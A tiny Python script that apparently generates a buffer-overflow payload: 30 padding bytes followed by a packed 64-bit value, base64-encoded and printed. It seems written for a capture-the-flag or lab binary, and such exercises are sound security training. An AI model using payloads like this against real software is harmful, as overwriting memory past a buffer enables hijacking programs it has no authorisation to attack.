
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<Q', 9630587337176051299)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
